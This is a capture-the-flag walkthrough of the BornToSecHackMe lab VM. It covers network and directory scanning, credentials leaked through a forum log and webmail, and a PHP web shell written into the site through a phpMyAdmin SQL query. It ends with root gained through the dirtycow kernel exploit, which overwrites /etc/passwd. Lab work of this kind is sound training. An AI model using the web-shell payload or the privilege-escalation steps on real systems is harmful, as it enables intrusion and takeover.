# IP of Virtual Machine

Let's find IP of VM. To do it we use nmap.

```shell
pavel@pavel-VirtualBox:~/Desktop$ nmap 192.168.56.1-255
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-13 10:56 MSK
Nmap scan report for pavel-VirtualBox (192.168.56.102)
Host is up (0.00036s latency).
All 1000 scanned ports on pavel-VirtualBox (192.168.56.102) are closed

Nmap scan report for 192.168.56.104
Host is up (0.00044s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

The IP address of VM is 192.168.56.104

# Scan <https://192.168.56.104>

The next step is to go to http://192.168.56.104 in browser.
After that let's use dirb to analyze it.

```shell
pavel@pavel-VirtualBox:~/Desktop$ dirb https://192.168.56.104 -r

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jan 13 11:13:12 2021
URL_BASE: https://192.168.56.104/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://192.168.56.104/ ----
+ https://192.168.56.104/cgi-bin/ (CODE:403|SIZE:291)                                                                                                                                                     
==> DIRECTORY: https://192.168.56.104/forum/                                                                                                                                                              
==> DIRECTORY: https://192.168.56.104/phpmyadmin/                                                                                                                                                         
+ https://192.168.56.104/server-status (CODE:403|SIZE:296)                                                                                                                                                
==> DIRECTORY: https://192.168.56.104/webmail/                                                                                                                                                            
                                                                                                                                                                                                          
-----------------
END_TIME: Wed Jan 13 11:13:14 2021
DOWNLOADED: 4612 - FOUND: 2
```

Let's check out the forum

```shell
==> DIRECTORY: https://192.168.56.104/forum/ 
```

# FORUM

Let's go to "Probleme login ?" page

Searching for "password" we can see an interesting log:
```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

The user confused the username with the password, and we can exploit this mistake.

Forum

    login: lmezard
    password: !q\]Ej?*5K5cy*AJ

Now let's get his e-mail from his profile in Forum and move to Webmail

Webmail

    login: laurie@borntosec.net
    password: !q\]Ej?*5K5cy*AJ
  
In hix box there is an email called "DB Access"

    Hey Laurie,

    You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

    Best regards.

Now we can go to 192.168.56.104/phpmyadmin

# PHP page as Shell

We will use SQL query to execute the commands via URL

```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile '/var/www/forum/templates_c/backdoor.php'
```

From this moment we will execute our commands
```
https://192.168.56.104/forum/templates_c/backdoor.php?cmd=ls%20/home
LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
```

```   
https://192.168.56.104/forum/templates_c/backdoor.php?cmd=ls%20/home/LOOKATAME
password
```

```
https://192.168.56.104/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```

So, let's use these login and password to connect via FTP. We can do it using FileZilla.

    host: 192.168.56.104
    user: lmezard
    pass: G!@M6f4Eatau{sF"
    port: 21

# Files into Password

There are two files 

1) fun - Archive
2) README.md

```
pavel@pavel-VirtualBox:/media/sf_shared_folder$ tar -xf fun
pavel@pavel-VirtualBox:/media/sf_shared_folder$ cat README 
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

Let's see what we had in an archive
```
pavel@pavel-VirtualBox:/media/sf_shared_folder$ ls -l ./ft_fun | wc -l
751
```

There are 751 files in that archive. And we arrange them in correct order using `script.py`.

After rearrangement we run the new `script.c` and get the password.

```shell
pavel@pavel-VirtualBox:/media/sf_shared_folder$ gcc script.c 
pavel@pavel-VirtualBox:/media/sf_shared_folder$ ./a.out 
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

```shell
pavel@pavel-VirtualBox:/media/sf_shared_folder$ echo -n Iheartpwnage | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

And now we're ready to connect via SSH

    login: laurie
    password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

# After SSH

For the next step we need to use system vulnerabilities.
The Linux kernel we are working with is:

``` bash
$ uname -r
3.2.0-91-generic-pae
```

``` bash
$ cat /etc/*-release
Ubuntu, 12.04
```

In order to explit it we search this [website](www.exploit-db.com) and find the [next variant](https://www.exploit-db.com/exploits/40839)

This exploit uses the dirtycow vulnerability, which is a computer security vulnerability for the Linux kernel that affected all Linux-based operating systems, including Android devices, that used older versions of the Linux kernel created before 2018. It is a local privilege escalation bug that exploits a race condition in the implementation of the copy-on-write mechanism in the kernel's memory-management subsystem. Computers and devices that still use the older kernels remain vulnerable.



After compiling and running the program the user will be prompted for the new password.

Then this exploit back up the /etc/passwd file to /tmp/passwd.bak and overwrites the root account with the generated line.

After running the exploit you should be able to login with the newly created user, whiср name is "firefart" by default, and use this exploit to modify the user values according to your needs.

Compile the file
``` bash
$ gcc -pthread dirty.c -o dirty -lcrypt
```
Run the script with your new password
``` bash
$ ./dirty <my-new-password>
```
Log in to the root user named firefart
``` bash
$ su firefart
```

Enter your new password
